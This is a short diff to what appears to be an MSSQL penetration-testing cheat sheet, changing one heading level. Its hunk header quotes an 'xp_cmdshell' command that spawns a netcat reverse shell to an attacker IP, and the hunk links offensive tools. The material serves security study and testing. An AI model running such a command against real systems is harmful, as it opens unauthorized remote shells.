@@ -40,6 +40,6 @@ EXEC xp_cmdshell '<PATH>/nc.exe -e cmd <ATTACKER-IP> <PORT>'
 > Microsoft SQL Database Attacking Tool -> [Msdat](https://github.com/quentinhardy/msdat)
 > [Mssql.py](https://github.com/Alamot/code-snippets/blob/master/mssql/mssql_shell.py) (Make sure to run with python3 and specify the username without the domain)
 
-# Further reading
+## Further reading
 - Four Parts ->  [Netspi](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
 - Cheatsheet -> [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)
